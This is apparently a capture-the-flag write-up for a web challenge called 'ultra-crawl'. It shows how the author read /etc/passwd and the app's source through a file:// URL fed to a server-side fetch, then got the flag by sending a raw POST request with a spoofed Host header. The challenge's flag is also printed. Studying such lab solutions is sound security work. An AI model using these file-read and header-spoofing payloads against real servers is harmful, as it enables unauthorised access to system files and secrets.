# ultra-crawl

After trying a few websites and googleing vulnerabilitys in the Werkzeug/2.0.1 cve database, I figured that I can simply send file:// to get any file from the system. (googleing all that was useless, but still)

If we do file:///etc/passwd we ca see there is a user named ctf and if we remember that we have a python server we can asume that there will be a file named /home/ctf/app.py.
So there is one. After entering file:///home/ctf/app.py we get this source code (but much uglier):
```python
import base64 
from urllib.request import urlopen 
from flask import Flask, render_template, request 
app = Flask(__name__) 
@app.route('/', methods=['GET', 'POST']) 
def index(): 
    print(request.headers['Host']) 
    if request.headers['Host'] == "company.tld": 
        flag = open('sir-a-random-folder-for-the-flag/flag.txt').read() 
        return flag 
        if request.method == 'POST': 
            url = request.form.get('url') 
            output = urlopen(url).read().decode('utf-8') 
            if base64.b64decode("Y3Rmew==").decode('utf-8') in output: 
                return "nope! try harder!" 
            return output 
    else: 
        return render_template("index.html") 
if __name__ == '__main__': 
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True, use_evalex=False) 
```

After reading a little bit of the code we can see that simply having the host be company.tld we get the flag.
So in burp we can make this request and get the flag:
```sh
POST / HTTP/1.1
Host: company.tld
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://34.179.133.189:31343
Connection: keep-alive
Referer: http://34.179.133.189:31343/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=file%3A%2F%2F%2Fhome%2Fctf%2Fapp.py
```

flag: `ctf{d8b7e522b0ab04101e78ab1c6ff68c4cb2f30ce9d4427d4cd77bc19238367933}`